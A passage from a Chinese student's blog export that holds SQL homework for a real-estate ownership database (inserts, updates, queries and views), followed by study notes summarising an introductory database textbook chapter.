VALUES(&#x27;O&#x27;,&#x27;浩华地产&#x27;,&#x27;九歌花圃&#x27;,&#x27;德阳&#x27;,&#x27;德阳&#x27;,&#x27;住宅&#x27;,&#x27;136&#x27;,&#x27;120&#x27;,&#x27;2017/2/26&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;P&#x27;,&#x27;承泰国际&#x27;,&#x27;公寓枫情&#x27;,&#x27;天津&#x27;,&#x27;天津&#x27;,&#x27;商铺&#x27;,&#x27;200&#x27;,&#x27;190&#x27;,&#x27;2017/1/7&#x27;,&#x27;70&#x27;,NULL);--完善Register表：INSERT INTO &quot;Registration&quot; VALUES(&#x27;1&#x27;,&#x27;510722200011268436&#x27;,&#x27;A&#x27;,&#x27;1325232&#x27;,&#x27;2019/6/12&#x27;,&#x27;2020/1/12&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;2&#x27;,&#x27;110221200301012836&#x27;,&#x27;B&#x27;,&#x27;122136987&#x27;,&#x27;2016/11/30&#x27;,&#x27;2017/6/19&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;3&#x27;,&#x27;370503198904032299&#x27;,&#x27;C&#x27;,&#x27;3266954&#x27;,&#x27;2009/1/23&#x27;,&#x27;2010/3/6&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;4&#x27;,&#x27;440402199804078098&#x27;,&#x27;D&#x27;,&#x27;31146252&#x27;,&#x27;2019/1/20&#x27;,&#x27;2019/12/12&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;5&#x27;,&#x27;120223199401018302&#x27;,&#x27;E&#x27;,&#x27;126952&#x27;,&#x27;2016/2/24&#x27;,&#x27;2016/4/15&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;6&#x27;,&#x27;110221200301012617&#x27;,&#x27;F&#x27;,&#x27;3632542&#x27;,&#x27;2020/12/18&#x27;,&#x27;2021/3/16&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;7&#x27;,&#x27;360103199103012782&#x27;,&#x27;G&#x27;,&#x27;1236024&#x27;,&#x27;2019/9/12&#x27;,&#x27;2020/6/12&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;8&#x27;,&#x27;320582199905175153&#x27;,&#x27;H&#x27;,&#x27;2999634&#x27;,&#x27;2017/8/17&#x27;,&#x27;2017/12/13&#x27;);--选择商铺项SELECT *FROM &quot;Estate&quot;WHERE &quot;EstateType&quot;=&#x27;商铺&#x27;;--竣工日期2018/12/1之后，产权面积大于90平方米的住宅的房产信息SELECT *FROM &quot;Estate&quot;WHERE &quot;CompletedDate&quot;&gt;=&#x27;2018/12/1&#x27; AND &quot;ProPertyArea&quot;&gt;&#x27;90&#x27; AND &quot;EstateType&quot;=&#x27;住宅&#x27;;--为了体现一人多套房产，我们对表Registration添加如下内容INSERT INTO &quot;Registration&quot; VALUES(&#x27;9&#x27;,&#x27;510722200011268436&#x27;,&#x27;I&#x27;,&#x27;97523621&#x27;,&#x27;2000/12/12&#x27;,&#x27;2001/9/13&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;10&#x27;,&#x27;120223199401018302&#x27;,&#x27;J&#x27;,&#x27;3256564&#x27;,&#x27;2001/12/25&#x27;,&#x27;2003/11/26&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;11&#x27;,&#x27;510722200011268436&#x27;,&#x27;K&#x27;,&#x27;3565346&#x27;,&#x27;2007/9/30&#x27;,&#x27;2008/12/3&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;12&#x27;,&#x27;440402199804078098&#x27;,&#x27;L&#x27;,&#x27;96236565&#x27;,&#x27;2016/6/30&#x27;,&#x27;2019/9/8&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;13&#x27;,&#x27;440402199804078098&#x27;,&#x27;M&#x27;,&#x27;22132321&#x27;,&#x27;2018/9/17&#x27;,&#x27;2018/11/4&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;14&#x27;,&#x27;440402199804078098&#x27;,&#x27;N&#x27;,&#x27;13326465&#x27;,&#x27;2014/1/1&#x27;,&#x27;2016/12/30&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;15&#x27;,&#x27;440402199804078098&#x27;,&#x27;O&#x27;,&#x27;1296357&#x27;,&#x27;2016/1/3&#x27;,&#x27;2017/6/8&#x27;);INSERT INTO &quot;Registration&quot; VALUES(&#x27;16&#x27;,&#x27;370503198904032299&#x27;,&#x27;P&#x27;,&#x27;9615362&#x27;,&#x27;2016/9/16&#x27;,&#x27;2017/8/19&#x27;);--查询个人在各地购买住宅两套以上的业主信息。SELECT A.&quot;PersonID&quot; AS 身份证号,A.&quot;Name&quot; AS 名字,A.&quot;Gender&quot; AS 性别,A.&quot;Occupation&quot; AS 职业,A.&quot;Addr&quot; AS 住址,A.&quot;Tel&quot; AS 电话,COUNT(A.&quot;PersonID&quot;) AS 总套数FROM &quot;Owner&quot; AS A JOIN &quot;Registration&quot; AS BON A.&quot;PersonID&quot;=B.&quot;PersonID&quot;GROUP BY A.&quot;PersonID&quot;HAVING COUNT(A.&quot;PersonID&quot;)&gt;=2;--查询个人在特定的城市购买住宅两套以上的业主的基本信息--为了效果明显，我们修改数据UPDATE &quot;Estate&quot;SET &quot;EstateCity&quot;=&#x27;成都&#x27;WHERE &quot;EstateID&quot; = &#x27;C&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateCity&quot;=&#x27;成都&#x27;WHERE &quot;EstateID&quot; = &#x27;G&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateCity&quot;=&#x27;成都&#x27;WHERE &quot;EstateID&quot; = &#x27;O&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateCity&quot;=&#x27;北京&#x27;WHERE &quot;EstateID&quot; = &#x27;D&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateCity&quot;=&#x27;北京&#x27;WHERE &quot;EstateID&quot; = &#x27;L&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateCity&quot;=&#x27;北京&#x27;WHERE &quot;EstateID&quot; = &#x27;P&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateAddr&quot;=&#x27;成都&#x27;WHERE &quot;EstateID&quot; = &#x27;C&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateAddr&quot;=&#x27;成都&#x27;WHERE &quot;EstateID&quot; = &#x27;G&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateAddr&quot;=&#x27;成都&#x27;WHERE &quot;EstateID&quot; = &#x27;O&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateAddr&quot;=&#x27;北京&#x27;WHERE &quot;EstateID&quot; = &#x27;D&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateAddr&quot;=&#x27;北京&#x27;WHERE &quot;EstateID&quot; = &#x27;L&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateAddr&quot;=&#x27;北京&#x27;WHERE &quot;EstateID&quot; = &#x27;P&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateCity&quot; = &#x27;绵阳&#x27;WHERE &quot;EstateID&quot; = &#x27;K&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateAddr&quot; = &#x27;绵阳&#x27;WHERE &quot;EstateID&quot; = &#x27;K&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateType&quot; = &#x27;住宅&#x27;WHERE &quot;EstateID&quot; = &#x27;L&#x27;;UPDATE &quot;Estate&quot;SET &quot;EstateType&quot; = &#x27;住宅&#x27;WHERE &quot;EstateID&quot; = &#x27;M&#x27;;--查询SELECT A.&quot;PersonID&quot; AS 身份证号,A.&quot;Name&quot; AS 名字,A.&quot;Gender&quot; AS 性别,A.&quot;Occupation&quot; AS 职业,A.&quot;Addr&quot; AS 住址,A.&quot;Tel&quot; AS 电话,COUNT(A.&quot;PersonID&quot;) AS 总套数FROM &quot;Owner&quot; AS A JOIN &quot;Registration&quot; AS BON A.&quot;PersonID&quot;=B.&quot;PersonID&quot; JOIN &quot;Estate&quot; AS C ON B.&quot;EstateID&quot;=C.&quot;EstateID&quot;WHERE C.&quot;EstateType&quot;=&#x27;住宅&#x27;GROUP BY C.&quot;EstateCity&quot;,A.&quot;PersonID&quot;HAVING COUNT(A.&quot;PersonID&quot;)&gt;=2;--统计2018年度某城市各类房产销售面积--为了效果明显，我们改一些购买日期UPDATE &quot;Registration&quot;SET &quot;PurchasedDate&quot; = &#x27;2018/7/03&#x27;WHERE &quot;EstateID&quot; = &#x27;B&#x27;;UPDATE &quot;Registration&quot;SET &quot;PurchasedDate&quot; = &#x27;2018/6/13&#x27;WHERE &quot;EstateID&quot; = &#x27;D&#x27;;UPDATE &quot;Registration&quot;SET &quot;PurchasedDate&quot; = &#x27;2018/4/06&#x27;WHERE &quot;EstateID&quot; = &#x27;G&#x27;;UPDATE &quot;Registration&quot;SET &quot;PurchasedDate&quot; = &#x27;2018/3/30&#x27;WHERE &quot;EstateID&quot; = &#x27;P&#x27;;SELECT &quot;EstateType&quot; AS 房产类型,SUM(&quot;ProPertyArea&quot;) AS 销售面积之和FROM &quot;Estate&quot; AS A JOIN &quot;Registration&quot; AS BON A.&quot;EstateID&quot;=B.&quot;EstateID&quot;WHERE B.&quot;PurchasedDate&quot; BETWEEN &#x27;2018/01/01&#x27; AND &#x27;2018/12/30&#x27;GROUP BY &quot;EstateType&quot;;--统计2018年度某城市各类房产销售金额--方案一：SELECT &quot;EstateType&quot; AS 房产类型,SUM(&quot;Price&quot;) AS 销售金额之和FROM &quot;Estate&quot;,&quot;Registration&quot;WHERE &quot;Estate&quot;.&quot;EstateID&quot;=&quot;Registration&quot;.&quot;EstateID&quot; AND &quot;Registration&quot;.&quot;PurchasedDate&quot; BETWEEN &#x27;2018/01/01&#x27; AND &#x27;2018/12/30&#x27;GROUP BY &quot;EstateType&quot;;--方案二：SELECT &quot;EstateType&quot; AS 房产类型,SUM(&quot;Price&quot;) AS 销售金额之和FROM &quot;Estate&quot; AS A JOIN &quot;Registration&quot; AS BON A.&quot;EstateID&quot;=B.&quot;EstateID&quot;WHERE B.&quot;PurchasedDate&quot; BETWEEN &#x27;2018/01/01&#x27; AND &#x27;2018/12/30&#x27;GROUP BY &quot;EstateType&quot;;--视图一CREATE VIEW &quot;View_One&quot; ASSELECT A.&quot;PersonID&quot; AS &quot;身份证号&quot;,A.&quot;EstateID&quot; AS &quot;房产编号&quot;,A.&quot;EstateName&quot; AS &quot;房产名称&quot;,A.&quot;EstateType&quot; AS &quot;房产类型&quot;,A.&quot;ProPertyArea&quot; AS &quot;产权面积&quot;,B.&quot;Price&quot; AS &quot;购买金额&quot;,B.&quot;PurchasedDate&quot; AS &quot;购买日期&quot;,&quot;EstateBuildName&quot; AS &quot;房产楼盘&quot;,&quot;EstateAddr&quot; AS &quot;房产城市&quot;FROM &quot;Estate&quot; AS A JOIN&quot;Registration&quot; AS B ON A.&quot;EstateID&quot;=B.&quot;EstateID&quot;;SELECT &quot;房产编号&quot;,&quot;房产名称&quot;,&quot;房产类型&quot;,&quot;产权面积&quot;,&quot;购买金额&quot;,&quot;购买日期&quot;,&quot;房产楼盘&quot;,&quot;房产城市&quot;FROM &quot;View_One&quot;WHERE 身份证号 = &#x27;510722200011268436&#x27;ORDER BY 购买日期 DESC;--统计2018年各个城市销售总套数/总金额--统计CREATE VIEW &quot;View_Two&quot; ASSELECT A.&quot;EstateCity&quot; AS 城市,SUM(B.&quot;Price&quot;) AS 总金额,COUNT(A.&quot;EstateCity&quot;) AS 总套数FROM &quot;Estate&quot; AS A JOIN &quot;Registration&quot; AS BON A.&quot;EstateID&quot;=B.&quot;EstateID&quot;WHERE B.&quot;PurchasedDate&quot; BETWEEN &#x27;2018/01/01&#x27; AND &#x27;2018/12/30&#x27;GROUP BY A.&quot;EstateCity&quot; 注意：本人认真写的数据库作业，但是我其实也不确定有没有错的，看的人参考就好，哈哈。","categories":[],"tags":[{"name":"答案","slug":"答案","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E7%AD%94%E6%A1%88/"}]},{"title":"数据库笔记","slug":"数据库学习","date":"2021-03-27T13:08:49.000Z","updated":"2021-11-22T07:42:27.248Z","comments":true,"path":"2021/03/27/数据库学习/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"教材：《数据库系统原理、设计与编程》陆鑫 张凤荔 陈安龙/编著 第一章 数据库系统基础数据库技术的核心是实现信息化应用与服务的核心技术之一，它涉及数据组织与存储、数据存取模型、数据操作语言、数据架构与模型设计、数据管理与系统处理、应用数据访问编程等技术主题。 PostgreSQL对象-关系数据库 1.1 数据库及其系统的概念1.1.1 数据库定义任何信息系统的技术实现，均需要使用具有特定数据模型的系统容器组织与存储数据，同时还需要相应的系统软件支持应用程序对系统容器中的数据进行共享操作。在计算机领域中，这类组织与存储数据的系统容器被称为“数据库”。 更专业的定义： 定义一：简单来说，数据库是一种电子化的文件柜，用户可以对文件柜中的数据进行新增、检索、更新、删除等操作。 定义二：数据库是以一定方式存储在一起的、能为多个用户所共享的数据集合。 定义三：数据库是依照某种数据模型组织起来的，并存放在存储器中的数据集合。这种数据集合有如下的特点：尽可能不重复存储数据，以优化方式为用户存取数据提供服务，其数据结构独立于它的应用程序，其数据的增删改和检索由统一软件进行管理和控制。 综上：我们可以将数据库理解为一种依照特定数据模型组织、存储和管理数据的文件集合。在信息系统中，数据库的基本作用是组织与存储系统数据，并为系统软件从中存取数据提供支持。 与文件系统中的普通数据文件明显不同，数据库文件有如下特点： 数据一般不重复存放。 可支持多个应用程序并发访问。 数据结构独立于使用它的应用程序。 对数据的增、删、改、查操作均由数据库系统软件进行控制和管理。 1.1.2 数据模型1.数据模型数据模型：一种描述事物对象数据特征及其结构的形式化表示，通常由数据结构、数据操作、数据约束三部分构成。 数据结构：用于描述事物对象的静态特征，其中包括事物对象的属性数据、数据类型、数据组织方式等。数据结构是数据模型的基础，数据操作和约束都是基于该数据结构进行的。 数据操作：用于描述事物对象的动态特征，即对事物对象的属性数据可进行的数据操作，如：插入、更新、删除、查询等。在数据模型中，我们通常还需要定义数据操作语言，如操作语句、操作规则及操作结果表示。 数据约束：用于描述事物对象的数据之间语义的联系，以及数据取值范围等规则，从而确保数据的完整性、一致性、有效性。 2.数据库所使用的数据模型传统数据库先后使用的数据模型主要有：层次数据模型、网状数据模型、关系数据模型。它们的根本区别在于数据之间的联系方式不同，即数据记录之间的联系方式不同。 层次数据模型，以”树结构“方式表示数据记录之间的联系。 网状数据模型，以”图结构“方式来表示数据记录之间的联系。 关系数据模型，以”二维关系表“方式表示数据之间的联系。 层次数据模型 最早使用的一种数据模型，其数据结构是一颗包含多个数据节点的”有向树“。根节点在最上端，层次最高；子节点在下层；最低层为叶节点。每个数据节点存储一个数据记录，数据节点之间通过链接指针进行联系。当需要访问层次数据模型的数据时，需要使用树节点遍历方法进行数据记录的操作。 特征：该模型将数据节点组织成多叉树关系的数据结构，程序采用关键字检索来遍历访问各个数据节点。 优点： 数据结构层次清晰，使用指针遍历访问各个数据节点。 数据节点的更新和扩展很容易实现。 关键字检索查询效率高。 缺点： 系统数据结构局限于层次结构，缺乏灵活性。 相同信息的数据节点可能存储多次，数据冗余大。 层次数据模型不适合具有拓扑空间的数据组织。 网状数据模型 网状数据模型以网络图表示数据节点之间的联系。该网状结构中的每一个数据节点代表一个数据记录，节点之间的联系也使用链接指针来实现，但网状结构模型可以表示数据节点之间的多个从属关系，同时也可以表示数据节点之间的横向关系。网状关系模型扩展了层次数据模型的数据关系，其数据处理更见方便。 特征：该模型采用链接指针来确定数据节点之间的联系，可支持具有多对多联系的数据节点组织方式。网状数据模型允许各个节点有多于一个的父节点，也可以有一个以上的节点没有父节点。 优点：能明确而方便地表示数据间的复杂关系，数据冗余较小。 缺点： 结构较复杂，增加了数据查询和数据定位的困难； 需要存储数据间联系的指针，使得数据存储量增大； 数据更新不方便，除了对数据进行更新外，还必须修改关联指针。 关系数据模型 关系数据模型（简称关系模型），以关系代数理论为基础，通过二维表结构来表示数据记录之间联系的数据模型。关系数据模型的每个二维表应具有关系特征，它们又被称为关系表。在关系数据模型中，多个二维表可以通过相同属性列的一致约束性进行数据关联。 优点： 数据结构简单，数据操作灵活 支持关系与集合运算操作 支持广泛使用的结构化查询语言（SQL） 容易实现与应用程序的数据独立性 缺点： 局限于结构化数据组织与存储。 支持的数据类型较简单。 难以支持非结构化数据和复杂数据处理。 现状：关系数据模型存取数据路径对用户隐蔽，使程序和数据具有高度的独立性。关系数据模型的数据操作语言为非过程化语言，具有集合处理能力，并能实现数据库对象的定义、操纵、控制等一体化处理。因此：关系数据模型是目前数据库使用最广泛的数据模型，几乎所有的结构化数据库管理系统产品都采用关系数据模型实现数据库。（Oracle、MySQL） 其他数据模型（如对象关系数据模型） 1.1.3 数据库系统的组成数据库系统：一种基于数据库进行数据管理与信息服务的软件系统。 数据库应用系统：数据库在应用领域实现数据存储、数据处理、数据检索、数据分析等功能。 数据库系统组成：用户、数据库应用程序、数据库管理系统、数据库4部分。 1.用户数据库系统中，用户可分为最终用户和DBA（DataBase Administrator）用户两类。 最终用户通过操作数据库应用程序处理业务，并利用程序存取数据库信息。数据库应用程序不能直接存取数据库信息，必须基于数据库管理系统（DataBase Management System，DBMS）提供的接口和环境才能访问数据库。 DBMA用户是一种专门进行数据库管理与运行维护的系统用户，该用户通过使用DBMS软件提供的管理工具对数据库进行创建、管理和维护，从而为数据库系统的正常运行提供支持与保护。 2.数据库应用程序数据库应用程序时是一种在DBMS支持下对数据库进行访问和处理的应用程序。它们以窗口和页面等表单形式来读取、更新、查询或统计数据库信息，从而实现业务数据处理与信息服务。 通过表单列表输出结果数据。 数据库应用程序需要使用DBMS提供的标准接口（如：JDBC/ODBC等）驱动程序连接数据库。 在程序设计语言编程中，我们需要使用数据库访问接口实现对数据库的操作。 3.数据库管理系统DBMSDBMS是一类用于创建、操纵和管理数据库的系统软件。数据库管理系统与操作系统一样都属于系统平台软件。 DBMS一般具有如下功能： 创建数据库、数据库表及其他对象 读/写、更新、删除数据库表数据（进行数据操纵） 维护数据库结构 执行数据访问规则 提供数据库并发访问控制和安全控制 执行数据库备份和恢复 DBMS层次结构 数据库应用程序 DBMS： ​ 操作界面层： ​ 由若干管理工具和应用程序API组成，分别为用户和应用程序访问数据库提供 接口界面。 ​ 语言翻译处理层： ​ 对应用程序中的数据库操作语句进行语法分析、视图转换、授权检查、查询优化等处理。 ​ 数据存取层： ​ 处理对象是数据表中的记录，他将上层的集合关系操作转换为数据记录操作，如对数据记录进行存取、维护存取路径、并发控制、事物管理、日志记录等。 ​ 数据存储层 ：基于操作系统提供的系统调用对数据库文件进行数据块读/写操作，并完成数据页、系统缓冲、内外存交换、外存数据文件等操作系统管理。 操作系统 数据库文件 4.数据库数据库系统中，数据库是存放系统各类数据的容器。该容器按照一定的数据模型组织与存储数据。目前，数据库系统使用最多的数据库软件产品是关系数据库软件。这类数据库软件采用关系数据模型实现数据组织与存储。 除了存放用户数据外，我们还需要存放描述数据库结构的元数据。例如：关系数据库中，各个关系表的表名称、列名称、列数据类型、数据约束规则等都是元数据，这些描述数据库结构的数据需要存放在数据库的系统表中。 关系数据库存储的主要数据信息类型： 用户数据 元数据 索引数据 其他数据 在关系数据库中，数据库元数据（必要）、索引数据、运行数据等（都是管理数据的数据），存放在系统表中，用户数据则只能存放于用户表中。 1.2 数据库技术的发展数据库技术是一种利用计算机组织、存储和管理数据的软件技术。它涉及研究数据库的结构、存储、设计、管理、应用的基本理论和实现方法，并来利用这些理论对数据库中的数据进行存取、计算、统计以及分析等操作。 1.2.1 数据管理技术的演化数据库技术现已称为当今计算机软件领域发展最迅速、应用最广泛的技术。不仅应用于数据资源存取管理，还应用于信息检索、数据仓库、数据挖掘、商业智能、大数据处理等领域。在利用计算机进行数据管理的技术发展历程中，数据管理经历了人工数据管理、文件系统管理、数据库管理3个阶段。 1.人工数据管理在涉及数据处理的计算机程序中，程序员必须在代码中进行数据管理。 2.文件系统管理操作系统出现后，可使用数据文件方式来组织、存储数据，并采用文件系统工具管理各个独立的数据文件。文件系统可以按照数据文件的名称对其进行访问，既可对数据文件中的数据记录进行存取，也可以对数据记录进行更新、插入、删除。文件系统实现了数据在记录内的结构化，即在数据文件的各个记录中，数据项组成是一致的。但是从整体看数据文件，数据记录之间是无结构的，不能处理数据记录之间的关联性。 用户可以使用高级程序语言对数据文件进行数据记录的存取，解决了人工数据管理的限制，可以满足应用的基本数据管理要求。 不足： 编写应用程序管理数据的过程比较繁琐。–繁琐 数据文件对应用程序存在依赖，难以实现独立。–不独立 不支持多用户对数据文件并发访问。–无法并发访问 不能实现数据文件的安全控制。–无法安全控制 难以解决不同数据文件之间的数据冗余。–数据冗余 在文件中，数据记录之间缺少联系，难以满足用户对数据的关联访问。–数据关联性差 3.数据库管理（实现了数据共享）DBMS出现，在这个阶段，用户可以使用DBMS来实现应用系统的数据管理。应用程序连接数据库后，用户可以使用数据库操作语言对其表中数据进行操作。所有对数据库的操作都由数据库管理DBMS自动去完成，应用程序不需要考虑数据库文件的物理操作和系统控制。 数据库管理与文件数据管理比，有如下优点： 应用程序与数据相互独立，避免了应用程序对数据的依赖性。 应用程序访问数据库使用标准语言操作，编程访问简单。 数据组织结构化、共享性高、冗余小。 提供数据的安全访问机制，并保证数据的完整性、一致性、正确性。 1.2.2 数据库技术的发展阶段数据模型是数据库技术的核心，数据模型的发展演变可以作为数据库技术发展阶段的主要标志。 数据库技术主要经历了三代： 第一代：层次数据模型和网状数据模型为特征的数据库技术。 第二代：关系数据模型为特征的数据库技术。 第三代：以面向数据对象数据模型为主要特征的数据库技术。 目前第四代：数据库技术与计算机网络技术、人工智能技术、并行计算技术、多媒体技术、云计算技术、大数据技术等相互结合与相互促进，衍生出大量的数据库新技术，其典型特征是采用非结构化数据模型处理大数据。 1.2.3 数据库领域新技术1.NoSQL技术现在大量互联网应用数据以非结构化形式存在，如：网页信息、文档信息、报表信息、音视频信息、即时通信消息等。海量的非结构化数据时刻都在进行结构化处理，势必带来系统对信息数据处理的开销和时效性不满足需求的问题。NoSQL数据库技术是一类针对大量互联网应用的非结构化数据处理需求而产生的一种分布式非关系数据库技术。它突破了传统关系数据库结构中必须等长存储各记录行数据的限制，它支持重复字段、子字段以及变长字段，并可以实现对变长数据和重复数据类型进行处理，在处理各类文档、报表、图像、音视频等非结构化数据中有着传统关系数据库所无法比拟的优势。因此，NoSQL数据库技术称为成为支持大数据应用的数据管理主流技术。 2.NewSQL技术虽然NoSQL数据库技术可以有效解决非结构化数据存储与大数据操作，具有良好的扩展性和灵活性，但不支持广泛使用的结构化数据访问SQL，也不支持数据库事物的ACID（原子性、一致性、隔离性、持久性）特性操作。另外，不同的NoSQL数据库都有各自的查询语言和数据模型，这使得开发者很难规范应用程序接口。因此，NoSQL数据库技术仅解决了互联网应用的非结构化数据处理需求，但对于企业应用的结构化数据管理并不合适。 NewSQL数据库技术是一种在NoSQL技术的基础上同时支持关系数据库访问的技术，这类数据库具有NoSQL对海量数据的分布式存储管理能力，还保持了兼容传统关系数据库的ACID和SQL等特性。NewSQL数据库技术不但支持非结构化数据管理的大数据应用，也支持结构化数据管理的关系数据库应用，它将成为未来主流的数据库技术。 3.领域数据库针对特定领域开发。数据库应用领域先后出现：工程数据库，统计数据库、科学数据库、空间数据库、地理信息数据库等。这些领域数据库在技术实现原理上与通用的数据库没有多大区别，只是与特定的领域结合，加强了数据库系统对有关领域的紧密结合。 4.数据仓库与数据挖掘数据库技术不局限于操作型数据库领域，对大量应用的历史数据进行有效存储与联机分析，已成为机构信息服务的重要需求。 数据仓库(Data Warehouse)：数据库已经存储了很长时间的数据的情况下，需要对积累的大量历史数据进行有效的存储组织，以便实现决策分析所需要的联机分析与数据挖掘处理。 数据仓库数据来自于若干分散的操作型数据库，管理具有面向主题、集成性、稳定性、时变性等特征。在数据仓库中，主要工作是对历史数据进行大量的查询操作或联机统计分析处理，以及定期的数据加载、刷新，很少进行数据更新和删除操作。 数据挖掘：建立在数据仓库的基础上，对大量数据进行模式或规律挖掘，从中发现有价值信息的技术。 数据挖掘一般包含3个步骤：数据预处理、规律寻找、结果可视化。数据预处理是从相关数据源中选取所需的数据并整合成用于数据挖掘的数据集；规律寻找，用某种方法将数据集合所含规律找出来；结果可视化，表示尽可能以用户可以理解的方式将规律表示出来。 5.商业智能定义：一种利用现代数据仓库技术、联机分析处理技术、数据挖掘等技术对商业信息系统中积累的大量数据进行数据分析以实现商业价值的技术。 商业智能主要包括对商业信息的搜集、管理和分析过程，目的是使商业机构的各级决策者获得商业运营信息或规律洞察力，促使他们做出对机构更有利的决策。基本体系结构包括：数据仓库、联机分析处理、数据挖掘。 辅助商业决策。 6.大数据分析处理技术（只有它能处理非结构化数据）传统的数据挖掘和商业智能处理的数据类型有限，不能快速处理海量的非结构化数据。 大数据：数据规模以及复杂性难以用传统数据管理软件以合理成本及可以接受的时限对其进行数据分析的数据集。 对比已有数据分析处理技术，大数据分析处理技术具有快速、廉价、性能强等综合优势。 讨论： 关系数据库不适合大数据应用处理，由于大数据应用处理针对非结构化数据，这些数据无法二维表化。 结构化数据与非结构化数据区别：能否二维表化 NoSQL与NewSQL的区别：NoSQL支持非关系数据库访问，NewSQL支持结构化和非结构化数据库访问。 1.3 数据库应用系统数据库应用系统：借助数据库进行信息化处理的计算机应用系统。 1.3.1 数据库应用数据的类型 业务处理系统 定义：运用数据库应用程序对机构日常业务活动信息进行记录、计算、检索、汇总、统计等数据处理，为机构操作层面提供业务信息化处理服务，提高业务处理效率的信息系统。 业务处理系统处理分为：联机业务处理和业务延迟批处理。 管理信息系统 定义：一种以机构职能管理为目标，利用计算机软硬件、网络通信、数据库等IT技术，实现机构职能整体信息化管理，以达到规范化管理和提高机构工作效率，并支持机构职能服务的信息系统。 决策支持系统 定义：以管理科学、运筹学、控制论、行为科学为基础，以计算机技术、数据库技术、人工智能技术为手段，解决特定领域的决策管理问题，为管理者提供辅助决策服务和方案的信息系统。 1.3.2 数据库应用系统的结构 单用户结构 数据库应用系统服务对象为单个用户，应用系统软件和数据库安装在一台计算机上运行。 特点：单用户结构中，数据库应用系统的各个部件都部署在一台计算机上，一个用户进行应用功能操作，并获得数据处理服务。 优缺点：结构简单，易于维护，但是只适用于单用户使用，不能实现用户之间数据的共享和交换。 集中式结构 一些多终端业务系统中，应用程序、数据库及其DBMS安装于同一台服务器上运行，而用户则使用自己的客户端计算机或智能手机通过网络连接访问服务器系统，业务服务系统的所有处理操作都是在服务器集中处理。 特点：数据库应用系统的数据集中、处理集。支持多个用户并发访问服务器系统，能够实现用户之间的数据共享。 优缺点：可利用服务器实现集中计算、结构简单、易于维护，但是当终端用户增加到一定数量后，服务器响应客户机请求访问将会成为瓶颈，系统处理性能大大降低。 客户/服务器结构 应用系统的处理逻辑分布在客户机和服务器中，各个计算机分担处理系统逻辑，如：服务器运行数据库和DBMS，客户机运行处理应用程序的逻辑。 数据库服务器：专门用于运行DBMS软件以及数据库的服务器。 客户机：运行计算机应用程序的计算机。 客户端应用程序将数据访问请求传送到数据库服务器；数据库服务器接受请求，对数据库进行数据操作处理，并将数据操作结果返回给客户端应用程序。 特点：数据库应用系统的数据集中管理、应用分布处理。客户端应用程序通过网络并发访问数据库服务器数据库。 优缺点：客户/服务器模式的数据库应用系统通过各个计算机分担处理任务，可提高整个系统的处理能力，但当客户机节点很多时，其网络与数据库服务器都可能成为系统性能瓶颈。 分布式结构 数据库系统由分布在多个服务器运行的数据库节点构成。分布式数据库管理系统提供了有效的一致性存取手段来操纵这些节点上的数据库，使这些分布的数据库在逻辑上可被视为一个完整的数据库，而物理上它们是地理分散在各个服务器节点的数据库。 特点：分布式结构既实现数据分布，又实现处理分布。在分布式结构中，各服务器处理节点数据库在逻辑上是一个整体，但物理分布在计算机网络的不同服务器节点上运行。每个数据库服务器可通过网络既支持多个本地客户机访问，也支持远程客户访问，网络中的每个数据库可以独立地存取与处理数据，并执行全局应用。 优缺点：适应跨地区的大型机构和企业等组织对数据库应用的需求，其处理性能强，但数据库分布处理与维护有一定的开销和技术困难。 1.3.3 数据库应用系统生命周期按软件工程思想，其生命周期可分为：系统需求设计、系统设计、系统实现、系统测试、系统运行维护等阶段。 1.系统需求设计系统分析人员与用户交流，按照需求工程方法获取系统数据需求信息。采用需求模型定义系统数据组成。 需求信息收集 由高层到低层展开 需求信息分析 采用面向对象分析方法或结构化分析方法建模，描述业务流程以及业务数据联系形式。 系统需求规格说明 定义详尽数据字典。 2.系统设计在数据库应用系统设计阶段，系统设计人员依据系统需求档案，开展系统总体设计和详细设计。设计内容包括：系统架构设计、软件功能结构设计、功能模块化设计、功能模块逻辑设计、系统数据库设计、系统接口设计。 系统数据库设计又分为概念数据模型、逻辑数据模型、物理数据模型设计。 3.系统实现按照系统设计方案进行数据库应用系统编程实现，分别进行软件程序编写、DBMS安装部署、数据库创建和数据对象实现等方面的工作。 创建数据库对象 用DBMS提供的数据语言DDL编写出数据库的源模式，经编译得到目标模式，执行目标模式即可建立实际数据库对象。 载入测试数据 4.系统测试针对数据库测试，则是依据数据库设计规范对软件系统的数据库结构、数据表及其之间的数据约束关系进行测试。 5.系统运行与维护 维护数据库系统安全性与完整性 监控与优化数据库系统运行性能 扩展数据库系统处理能力 思考：数据库表对象的创建是在哪个工作阶段？（系统实现阶段） 1.4 典型数据库管理系统 Microsoft SQL server 基于关系数据模型 Oracle DataBase MySQL 开源关系数据库管理系统，桌面级 PostgreSQL：开源对象-关系数据库管理系统 